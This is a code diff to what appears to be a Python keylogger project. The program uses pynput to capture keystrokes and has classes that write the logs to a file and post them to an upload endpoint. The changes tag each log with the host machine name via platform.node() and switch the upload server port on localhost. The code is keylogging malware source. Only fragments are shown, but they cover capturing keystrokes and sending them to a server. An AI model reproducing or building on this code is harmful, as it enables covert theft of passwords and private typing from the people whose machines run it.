@@ -5,6 +5,9 @@ import json
 from pynput import keyboard
 from pynput.keyboard import Key
 from cryptography.fernet import Fernet
+import platform
+
+
 
 class KeyLoggerService:
     def __init__(self):
@@ -32,7 +35,7 @@ class KeyLoggerService:
 
 class FileWriter:
     @staticmethod
-    def write_to_file(logs, machine_name="windows"):
+    def write_to_file(logs, machine_name= platform.node()):
         new_task = {
             "machine": machine_name,
             "data": logs
@@ -42,7 +45,7 @@ class FileWriter:
             log_file.write("\n")
 
 class ServerSender:
-    def __init__(self, server_url, service, machine_name="Mac"):
+    def __init__(self, server_url, service, machine_name= platform.node() ):
         self.server_url = server_url
         self.service = service
         self.machine_name = machine_name
@@ -72,7 +75,7 @@ class KeyLoggerManager:
     def __init__(self):
         self.service = KeyLoggerService()
         self.file_writer = FileWriter()
-        self.server_sender = ServerSender("http://127.0.0.1:5001/api/upload", self.service)
+        self.server_sender = ServerSender("http://127.0.0.1:5000/api/upload", self.service)
         self.listener = None
 
     def handle_key_press(self, key):
